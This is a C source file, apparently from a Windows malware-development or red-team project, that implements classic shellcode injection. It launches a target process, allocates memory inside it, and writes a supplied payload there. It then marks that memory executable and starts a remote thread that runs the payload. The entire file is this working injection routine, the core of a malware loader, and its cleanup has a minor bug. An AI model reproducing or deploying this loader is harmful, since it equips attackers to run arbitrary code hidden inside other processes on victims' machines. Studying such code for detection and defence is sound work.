#include "ShellcodeInjection.h"

BOOL CreateTargetProcess
(
	_In_ LPCWSTR TargetProcessPath,
	_Out_ HANDLE* ProcessHandle,
	_Out_ HANDLE* ThreadHandle,
	_Out_ DWORD* ProcessId,
	_Out_ DWORD* ThreadId
)
{

	STARTUPINFOW si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	RtlSecureZeroMemory(&si, sizeof(STARTUPINFOW));
	RtlSecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	si.cb = sizeof(STARTUPINFOW);

	if (!CreateProcessW(TargetProcessPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
	{
		WARN("Failed To Create Process: %ls", TargetProcessPath);
		PRINT_ERROR("CreateProcessW");
		return FALSE; // no point of continuing if we can't even create the process
	}

	INFO("[0x%p] Process Handle", pi.hProcess);
	INFO("\t\t\t\\___ [%ld] ProcessId", pi.dwProcessId);
	INFO("[0x%p] Thread Handle", pi.hThread);
	INFO("\t\t\t\\___ [%ld] ThreadId", pi.dwThreadId);

	*ProcessHandle = pi.hProcess;
	*ThreadHandle = pi.hThread;
	*ProcessId = pi.dwProcessId;
	*ThreadId = pi.dwThreadId;

	return TRUE;

}

BOOL ShellcodeInjection
(
	_In_ HANDLE ProcessHandle,
	_In_ HANDLE ThreadHandle,
	_In_ PVOID Payload,
	_In_ SIZE_T PayloadSize,
	_In_ DWORD ProcessId,
	_In_ DWORD ThreadId
)
{

	BOOL State = TRUE;
	PVOID PayloadBuffer = NULL;
	DWORD dwOldProtection = 0;

	if (!(PayloadBuffer = VirtualAllocEx(ProcessHandle, NULL, PayloadSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE)) || PayloadBuffer == NULL)
	{
		WARN("Failed To Allocate %zu Bytes to PayloadBuffer!", PayloadSize);
		PRINT_ERROR("VirtualAllocEx");
		State = FALSE; goto _END_FUNC;
	}

	INFO("Successfully allocated %zu Bytes to PayloadBuffer!", PayloadSize);

	if (!WriteProcessMemory(ProcessHandle, PayloadBuffer, Payload, PayloadSize, NULL))
	{
		WARN("Failed To Write Our Payload To Target Process");
		PRINT_ERROR("WriteProcessMemory");
		State = FALSE; goto _END_FUNC;
	}

	INFO("Successfully Wrote %zu Bytes to Target Process!", PayloadSize);
	INFO("Base Address --> [0x%p] Buffer Address --> {0x%p]", PayloadBuffer, Payload);

	if (!VirtualProtectEx(ProcessHandle, PayloadBuffer, PayloadSize, PAGE_EXECUTE_READ, &dwOldProtection))
	{
		WARN("Failed To Change Memory Protections!");
		PRINT_ERROR("VirtualProtectEx");
		State = FALSE; goto _END_FUNC;
	}

	INFO("Memory Protections Changed! PAGE_READWRITE --> PAGE_EXECUTE_READ");

	if (!(ThreadHandle = CreateRemoteThreadEx(ProcessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)PayloadBuffer, NULL, 0, NULL, &ThreadId)) || ThreadHandle == NULL)
	{
		WARN("Failed To Create a new Thread Pointing to Our Payload!");
		PRINT_ERROR("CreateRemoteThreadEx");
		State = FALSE; goto _END_FUNC;
	}

	INFO("Newly Created Thread! Pointing to Payload Buffer --> [0x%p]", PayloadBuffer);
	INFO("Waiting For Thread To Finish Executing...");

	WaitForSingleObject(ThreadHandle, INFINITE);

	OKAY("DONE!");

_END_FUNC:

	if (ThreadHandle)
		CloseHandle(ThreadHandle);

	if (ProcessHandle)
		CloseHandle(ProcessHandle);

	if (PayloadBuffer)
		VirtualFree(PayloadBuffer, 0, MEM_RELEASE);

	return State;

}